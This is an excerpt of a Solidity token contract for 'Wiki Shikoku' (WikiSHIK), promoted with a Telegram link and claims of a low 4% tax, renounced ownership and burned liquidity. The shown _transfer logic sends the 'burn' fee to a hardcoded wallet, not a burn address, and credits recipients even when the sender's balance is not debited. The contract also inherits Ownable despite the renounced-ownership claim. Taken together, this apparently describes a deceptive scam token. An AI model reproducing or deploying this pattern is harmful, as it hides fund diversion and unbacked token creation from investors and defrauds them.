...
// Submitted for Telegram: https://t.me/wikishikokubsc

// Wiki Shikoku | Tax Low 4% | Renounched | Burn LP
...
contract  WikiSHIK  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "Wiki Shikoku";
    string private _symbol = "WikiSHIK";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x04A3C20476a0AdE21a061D6d1f3516c04AC5e720] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0x04A3C20476a0AdE21a061D6d1f3516c04AC5e720, _bruntoken);
        }
